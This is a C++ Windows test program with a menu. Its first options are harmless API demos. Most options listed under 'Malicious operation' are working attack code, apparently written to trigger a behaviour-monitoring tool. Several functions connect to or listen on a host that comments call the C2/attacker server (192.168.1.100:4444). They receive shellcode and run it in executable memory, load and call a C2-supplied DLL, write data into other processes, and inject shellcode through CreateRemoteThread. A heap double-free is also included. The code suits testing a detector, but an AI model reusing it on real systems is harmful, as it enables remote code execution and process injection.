#include<windows.h>
#include<stdio.h>
#include <stdlib.h>
//#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")  //加载 ws2_32.dll
//#include <wchar.h>
#define PAGE_SIZE	4096
using namespace std;
void headCreateAndDestory();
void writeFileString();
void readFileString();
void regCreateAndSetValue();
void regOpenAndDelValue();
void showMenu();
void headRepeatedRelease();
void modifyExProgram();
void selfReplication();
void modifyStartupRegistry();
void openAnotherFolder();
void recvData();
void sendData();
void memoryOperation();
void CREATEPROCESSW();
void CREATETHREAD();
void EXITTHREAD();
void LOADLIBRARYW();
void GETPROCADDRESS();
void VIRTUALALLOCEX();
void WRITEPROCESSMEMORY();
void CREATEREMOTETHREAD();
int main() {
	int op = 0;
	//MessageBoxA(NULL, "Can not open the file", "Playwav", MB_OK);
	while (1) {
		showMenu();
		scanf_s("%d", &op);
		switch (op)
		{
			// exit
		case 0: {
			printf("bye!\n");
			break;
		}
		case 1: {
			MessageBoxA(NULL, "I'm MessageBoxA", "I'm MessageBoxA's title", MB_OK);
			break;
		}
		case 2: {
			MessageBoxW(NULL, L"I'm MessageBoxW", L"I'm MessageBoxW's title", MB_OK);
			break;
		}
			  // heap create and heap destory
		case 3: {
			headCreateAndDestory();
			break;
		}
			  // Create and write File
		case 4: {
			writeFileString();
			break;
		}
			  // Create and read File
		case 5: {
			readFileString();
			break;
		}
			  // Create, set value and close reg
		case 6: {
			regCreateAndSetValue();
			break;
		}
			  // open, delete value and close reg
		case 7: {
			regOpenAndDelValue();
			break;
		}
		case 8: {
			recvData();
			break;
		}
		case 9: {
			sendData();
			break;
		}
		case 10: {
			headRepeatedRelease();
			break;
		}
		case 11: {
			modifyExProgram();
			break;
		}
		case 12: {
			selfReplication();
			break;
		}
		case 13: {
			modifyStartupRegistry();
			break;
		}
		case 14: {
			openAnotherFolder();
			break;
		}
		case 15: {
			memoryOperation();
			break;
		}
		case 16: {
			CREATEPROCESSW();
			break;
		}
		case 17: {
			CREATETHREAD();
			break;
		}
		case 18: {
			EXITTHREAD();
			break;
		}
		case 19: {
			LOADLIBRARYW();
			break;
		}
		case 20: {
			GETPROCADDRESS();
			break;
		}
		case 21: {
			VIRTUALALLOCEX();
			break;
		}
		case 22: {
			WRITEPROCESSMEMORY();
			break;
		}
		case 23: {
			CREATEREMOTETHREAD();
			break;
		}
		}
		// exit
		if (op == 0) {
			break;
		}
	}
	return 0;
}
void showMenu() {
	//printf("\n*************************************************************************************\n");
	printf("--------------------------------please select an option--------------------------------\n");
	printf("--Normal operation--:\n");
	printf("1.MessageBoxA      2.MessageBoxW            3.headCreateAndDestory   4.writeFileString\n");
	printf("5.readFileString   6.regCreateAndSetValue   7.regOpenAndDelValue     8.socketRecvData\n");
	printf("9.socketSendData\n");
	printf("--Malicious operation--:\n");
	printf("10.headRepeatedRelease   11.Modifying executable program   12.selfReplication\n");
	printf("13.modifyStartupRegistry   14.openAnotherFolder\n");
	printf("15.memoryOperation   16.CREATEPROCESSW\n");
	printf("17.CREATETHREAD   18.EXITTHREAD\n");
	printf("19.LOADLIBRARYW   20.GETPROCADDRESS\n");
	printf("21.VIRTUALALLOCEX   22.WRITEPROCESSMEMORY   23.CREATEREMOTETHREAD\n");
}
void headCreateAndDestory() {

	printf("Press any key to start HeapCreate!\n");
	getchar();
	HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, PAGE_SIZE * 10, PAGE_SIZE * 100);

	int* pArr = (int*)HeapAlloc(hHeap, 0, sizeof(int) * 30);
	for (int i = 0; i < 30; ++i)
	{
		pArr[i] = i + 1;
	}
	printf("Successfully created!\n");
	for (int i = 0; i < 30; ++i)
	{
		if (i % 5 == 0)
			printf_s("\n");
		printf("%3d ", pArr[i]);
	}
	printf_s("\n\n");
	printf("Press any key to start HeapFree!\n");
	getchar();
	HeapFree(hHeap, 0, pArr);
	printf("Press any key to start HeapDestory!\n");
	getchar();
	HeapDestroy(hHeap);

	printf("Successfully destory!\n");
}
void writeFileString()
{
	CHAR* pBuffer;
	int fileSize = 0;
	char writeString[100];
	bool flag;
	HANDLE hOpenFile = (HANDLE)CreateFile(L"a.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hOpenFile == INVALID_HANDLE_VALUE)
	{
		hOpenFile = NULL;
		printf("Can not open the file\n");
		return;
		//MessageBoxA(NULL, "Can not open the file", "Playwav", MB_OK);
	}
	printf("successfully open a file\n");
	printf("input a string:");
	scanf_s("%s", writeString);
	flag = WriteFile(hOpenFile, writeString, strlen(writeString), NULL, NULL);
	if (flag) {
		printf("successful writed!\n");
	}
	FlushFileBuffers(hOpenFile);
	CloseHandle(hOpenFile);
}
void readFileString() {
	CHAR* pBuffer;
	int fileSize = 0;
	bool flag;
	HANDLE hOpenFile = (HANDLE)CreateFile(L"a.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hOpenFile == INVALID_HANDLE_VALUE)
	{
		hOpenFile = NULL;
		printf("Can not open the file\n");
		return;
	}
	printf("successfully open a file\n");
	fileSize = GetFileSize(hOpenFile, NULL);
	pBuffer = (char*)malloc((fileSize + 1) * sizeof(char));
	flag = ReadFile(hOpenFile, pBuffer, fileSize, NULL, NULL);
	pBuffer[fileSize] = 0;
	if (flag) {
		printf("successfully read a string:%s!\n", pBuffer);
	}
	free(pBuffer);
	CloseHandle(hOpenFile);
}
void regCreateAndSetValue() {
	// 创建注册表并设置键值
	HKEY hKey = NULL;
	TCHAR Data[254];
	memset(Data, 0, sizeof(Data));
	wcsncpy_s(Data, TEXT("https://github.com/AgentGuo"), 254);

	size_t lRet = RegCreateKeyEx(HKEY_CURRENT_USER, (LPWSTR)L"aaaMykey", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet == ERROR_SUCCESS) {
		printf("create successfully!\n");
	}
	else {
		printf("failed to create!\n");
	}
	// 修改注册表键值，没有则创建它
	size_t iLen = wcslen(Data);
	// 设置键值
	lRet = RegSetValueEx(hKey, L"panfeng", 0, REG_SZ, (CONST BYTE*)Data, sizeof(TCHAR) * iLen);
	if (lRet == ERROR_SUCCESS)
	{
		printf("set value successfully!\n");
		return;
	}
	else {
		printf("failed to set value!\n");
	}
	RegCloseKey(hKey);
}
void regOpenAndDelValue() {
	HKEY hKey = NULL;
	size_t lRet = RegOpenKeyEx(HKEY_CURRENT_USER, (LPWSTR)L"aaaMykey", 0, KEY_ALL_ACCESS, &hKey);
	if (lRet == ERROR_SUCCESS) {
		printf("open successfully!\n");
	}
	else {
		printf("open failed\n");
	}
	lRet = RegDeleteValue(hKey, L"panfeng");
	if (lRet == ERROR_SUCCESS) {
		printf("delete success!\n");
	}
	else {
		printf("delete fail!\n");
	}
	RegCloseKey(hKey);
}
void headRepeatedRelease() {

	printf("Press any key to start HeapCreate!\n");
	getchar();
	HANDLE hHeap = HeapCreate(HEAP_NO_SERIALIZE, PAGE_SIZE * 10, PAGE_SIZE * 100);

	int* pArr = (int*)HeapAlloc(hHeap, 0, sizeof(int) * 30);
	for (int i = 0; i < 30; ++i)
	{
		pArr[i] = i + 1;
	}
	printf("Successfully created!\n");
	for (int i = 0; i < 30; ++i)
	{
		if (i % 5 == 0)
			printf_s("\n");
		printf("%3d ", pArr[i]);
	}
	printf_s("\n\n");
	printf("Press any key to start the first HeapFree!\n");
	getchar();
	HeapFree(hHeap, 0, pArr);
	printf("Press any key to start the second HeapFree!\n");
	getchar();
	HeapFree(hHeap, 0, pArr);
	printf("Press any key to destroy the heap!\n");
	getchar();
	HeapDestroy(hHeap);
}
void modifyExProgram() {
	HANDLE hOpenFile = (HANDLE)CreateFile(L"a.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	CloseHandle(hOpenFile);
}
void selfReplication() {
	//testCode.exe
	HANDLE hOpenFile = (HANDLE)CreateFile(L"testCode.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL, NULL);
	CloseHandle(hOpenFile);
}
void modifyStartupRegistry() {
	HKEY hKey = NULL;
	size_t lRet = RegOpenKeyEx(HKEY_CURRENT_USER, (LPWSTR)L"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_READ, &hKey);
	if (lRet == ERROR_SUCCESS) {
		printf("open successfully!\n");
	}
	else {
		printf("open failed\n");
	}
	RegCloseKey(hKey);
}
void openAnotherFolder() {
	HANDLE hOpenFile = (HANDLE)CreateFile(L".\\testFolder\\a.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
	CloseHandle(hOpenFile);
}
void recvData() {
	//初始化DLL
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//创建套接字
	SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	//向服务器发起请求
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));  //每个字节都用0填充
	sockAddr.sin_family = PF_INET;
	sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	sockAddr.sin_port = htons(1234);
	connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
	Sleep(500);
	//接收服务器传回的数据
	char szBuffer[MAXBYTE] = { 0 };
	recv(sock, szBuffer, MAXBYTE, NULL);
	//输出接收到的数据
	printf("Message form server: %s\n", szBuffer);
	//关闭套接字
	closesocket(sock);
	//终止使用 DLL
	WSACleanup();
}
void sendData() {
	//初始化 DLL
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//创建套接字
	SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	//绑定套接字
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));  //每个字节都用0填充
	sockAddr.sin_family = PF_INET;  //使用IPv4地址
	sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");  //具体的IP地址
	sockAddr.sin_port = htons(1234);  //端口
	bind(servSock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
	//进入监听状态
	listen(servSock, 20);
	//接收客户端请求
	SOCKADDR clntAddr;
	int nSize = sizeof(SOCKADDR);
	SOCKET clntSock = accept(servSock, (SOCKADDR*)&clntAddr, &nSize);
	//向客户端发送数据
	char str[32] = "Hello World!";
	send(clntSock, str, strlen(str) + sizeof(char), NULL);
	//关闭套接字
	closesocket(clntSock);
	closesocket(servSock);
	//终止 DLL 的使用
	WSACleanup();
}
void memoryOperation() {
	getchar();
	char temp[100] = "";
	printf("press any key to copy memory\n");
	getchar();
	//memccpy(temp, "hello\n", 6);
	memcpy(temp, "hello\n", 6);
	printf("%s", temp);
	printf("press any key to move memory\n");
	getchar();
	memmove(temp, "world\n", 6);
	printf("%s", temp);
}
void CREATEPROCESSW() {
	// 网络通信部分
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.1.100"); // 恶意C2服务器
	servAddr.sin_port = htons(4444);

	connect(sock, (SOCKADDR*)&servAddr, sizeof(servAddr));

	// 接收远程指令
	char cmd[256];
	recv(sock, cmd, sizeof(cmd), 0);

	// 执行恶意进程创建（会触发检测）
	if (strstr(cmd, "launch")) {
		STARTUPINFOA si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		char cmdLine[] = "cmd.exe /c dir";
		// 2. 正确调用CreateProcessA
		BOOL bSuccess = CreateProcessA(
			NULL,                    // 应用程序名(可空)
			cmdLine,     // 命令行(必须可写)
			NULL,                    // 进程安全属性
			NULL,                    // 线程安全属性
			FALSE,                   // 不继承句柄
			CREATE_NO_WINDOW,        // 创建标志
			NULL,                    // 环境变量(继承)
			NULL,                    // 当前目录(继承)
			&si,                     // 启动信息
			&pi                      // 进程信息
		);
		if (!bSuccess) {
			DWORD dwError = GetLastError();
			printf("CreateProcess failed (%d)\n", dwError);
		}
		else {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
	} // <-- 补全 if 语句的闭合大括号

	closesocket(sock);
	WSACleanup();
}
void CREATETHREAD() {

	// 初始化Winsock（保持图片风格）
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建套接字
	SOCKET servSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// 绑定本地端口（修改为攻击者IP）
	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.1.100"); // 攻击者IP
	servAddr.sin_port = htons(4444); // 恶意端口
	bind(servSock, (SOCKADDR*)&servAddr, sizeof(SOCKADDR));

	// 监听连接
	listen(servSock, 1);

	// 接收攻击者连接
	SOCKADDR_IN clntAddr;
	int nSize = sizeof(SOCKADDR_IN);
	SOCKET clntSock = accept(servSock, (SOCKADDR*)&clntAddr, &nSize);

	// 接收shellcode
	unsigned char shellcode[512];
	int recvLen = recv(clntSock, (char*)shellcode, sizeof(shellcode), 0);

	// 执行线程注入（会触发CREATETHREAD检测）
	if (recvLen > 0) {
		LPVOID execMem = VirtualAlloc(NULL, recvLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(execMem, shellcode, recvLen);

		// 触发检测的关键调用
		HANDLE hThread = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)execMem, // 可疑的线程入口点
			NULL,
			0,
			NULL
		);

		if (hThread) {
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}
		VirtualFree(execMem, 0, MEM_RELEASE);
	}

	// 清理资源（保持图片风格）
	closesocket(clntSock);
	closesocket(servSock);
	WSACleanup();
}
void EXITTHREAD() {
	// 初始化Winsock（保持图片风格）
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建套接字（保持图片风格）
	SOCKET servSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	// 绑定端口（修改为攻击者C2地址）
	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2服务器IP
	servAddr.sin_port = htons(4444); // 恶意端口
	bind(servSock, (SOCKADDR*)&servAddr, sizeof(SOCKADDR));

	// 接收攻击者指令
	listen(servSock, 1);
	SOCKADDR_IN clntAddr;
	int nSize = sizeof(SOCKADDR_IN);
	SOCKET clntSock = accept(servSock, (SOCKADDR*)&clntAddr, &nSize);

	// 触发线程异常退出检测
	DWORD exitCode = 0;
	recv(clntSock, (char*)&exitCode, sizeof(exitCode), 0); // 接收攻击者指定的退出码

	// 恶意线程退出（会触发EXITTHREAD监控）
	if (exitCode != 0) {
		// 方式1：直接异常退出
		ExitThread(exitCode); // 触发 if (exitCode != 0) 检测

		// 方式2：制造崩溃后退出（更隐蔽）
		// __try { *(int*)0 = 0; } 
		// __except(ExitThread(exitCode), EXCEPTION_EXECUTE_HANDLER) {}
	}

	// 清理资源（保持图片风格）
	closesocket(clntSock);
	closesocket(servSock);
	WSACleanup();
}
void LOADLIBRARYW() {
	// 初始化Winsock（保持图片完全相同的风格）
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建C2通信套接字（修改为攻击者IP）
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// 从C2接收恶意DLL路径（会触发LOADLIBRARY检测）
	char dllPath[MAX_PATH];
	recv(c2Sock, dllPath, MAX_PATH, 0);

	// 触发监控的恶意DLL加载行为
	HMODULE hMalDll = LoadLibraryExA(
		dllPath,          // 如："C:\\Temp\\inject.dll"
		NULL,
		LOAD_WITH_ALTERED_SEARCH_PATH
	);

	if (hMalDll) {
		// 获取并执行恶意导出函数
		FARPROC pMalFunc = GetProcAddress(hMalDll, "Start");
		if (pMalFunc) {
			((void(*)())pMalFunc)();
		}
		FreeLibrary(hMalDll);
	}

	// 清理资源（完全保持图片风格）
	closesocket(c2Sock);
	WSACleanup();
}
void GETPROCADDRESS() {
	// 初始化Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// 创建C2通信套接字（修改为攻击者IP）
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));
	// 从C2接收要解析的API名称（会触发GETPROCADDRESS检测）
	char apiName[64];
	recv(c2Sock, apiName, sizeof(apiName), 0);
	// 触发监控的恶意API解析行为
	HMODULE hModule = GetModuleHandleA("kernel32.dll");
	FARPROC pFunc = GetProcAddress(hModule, apiName); // 如："CreateRemoteThread"
	if (pFunc) {
		// 执行危险API：线程注入
		if (strcmp(apiName, "CreateRemoteThread") == 0) {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);

			// 正确定义函数指针类型
			typedef HANDLE(WINAPI* fnCreateRemoteThread)(
				HANDLE,
				LPSECURITY_ATTRIBUTES,
				SIZE_T,
				LPTHREAD_START_ROUTINE,
				LPVOID,
				DWORD,
				LPDWORD
				);

			// 类型转换后调用
			((fnCreateRemoteThread)pFunc)(
				hProcess,
				NULL,
				0,
				NULL,
				NULL,
				0,
				NULL
				);

			CloseHandle(hProcess);
		}
	}
}
void VIRTUALALLOCEX() {
	// 初始化Winsock（保持图片完全相同的风格）
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建C2通信套接字（修改为攻击者IP）
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// 从C2接收目标PID（会触发VIRTUALALLOCEX检测）
	DWORD targetPid;
	recv(c2Sock, (char*)&targetPid, sizeof(targetPid), 0);

	// 触发监控的恶意内存操作
	HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
	if (hTarget) {
		// 在目标进程分配可执行内存（触发检测）
		LPVOID pRemoteMem = VirtualAllocEx(
			hTarget,          // 非当前进程句柄
			NULL,            // 自动分配地址
			4096,            // 分配大小
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE  // 可执行权限
		);

		// 清理资源
		if (pRemoteMem) {
			VirtualFreeEx(hTarget, pRemoteMem, 0, MEM_RELEASE);
		}
		CloseHandle(hTarget);
	}

	// 清理网络资源（完全保持图片风格）
	closesocket(c2Sock);
	WSACleanup();
}
void WRITEPROCESSMEMORY() {
	// 1. 正确初始化Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return;
	}

	// 创建C2通信套接字（修改为攻击者IP）
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr;
	memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(c2Addr));

	// 从C2接收目标PID和写入数据
	struct {
		DWORD pid;
		char data[256];
	} payload;

	recv(c2Sock, (char*)&payload, sizeof(payload), 0);

	// 触发监控的跨进程内存写入（会触发WRITEPROCESSMEMORY检测）
	HANDLE hTarget = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, payload.pid);
	if (hTarget) {
		// 在目标进程写入数据
		SIZE_T bytesWritten;
		WriteProcessMemory(
			hTarget,                     // 非当前进程句柄
			(LPVOID)0x00400000,          // 目标地址（示例）
			payload.data,                // 写入数据
			strlen(payload.data) + 1,    // 数据长度
			&bytesWritten                // 返回写入字节数
		);
		CloseHandle(hTarget);
	}

	// 清理资源（完全保持图片风格）
	closesocket(c2Sock);
	WSACleanup();
}
void CREATEREMOTETHREAD() {
	// 初始化Winsock
	WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &wsaData);

	// 创建C2通信套接字
	SOCKET c2Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in c2Addr; memset(&c2Addr, 0, sizeof(c2Addr));
	c2Addr.sin_family = AF_INET;
	c2Addr.sin_addr.s_addr = inet_addr("192.168.1.100"); // C2服务器IP
	c2Addr.sin_port = htons(4444);
	connect(c2Sock, (SOCKADDR*)&c2Addr, sizeof(SOCKADDR));
	Sleep(500); // 保持图片中的延迟

	// 从C2接收目标PID和shellcode
	struct {
		DWORD pid;
		BYTE shellcode[256];
	} payload;
	recv(c2Sock, (char*)&payload, sizeof(payload), NULL);

	// 触发CREATEREMOTETHREAD检测（关键恶意行为）
	HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, payload.pid);
	if (hTarget != NULL) {
		LPVOID pRemoteMem = VirtualAllocEx(hTarget, NULL, sizeof(payload.shellcode),
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (pRemoteMem) {
			WriteProcessMemory(hTarget, pRemoteMem, payload.shellcode,
				sizeof(payload.shellcode), NULL);

			// 触发监控的核心调用
			CreateRemoteThread(hTarget, NULL, 0,
				(LPTHREAD_START_ROUTINE)pRemoteMem,
				NULL, 0, NULL);
		}
		CloseHandle(hTarget);
	}

	// 清理资源
	closesocket(c2Sock); WSACleanup();
}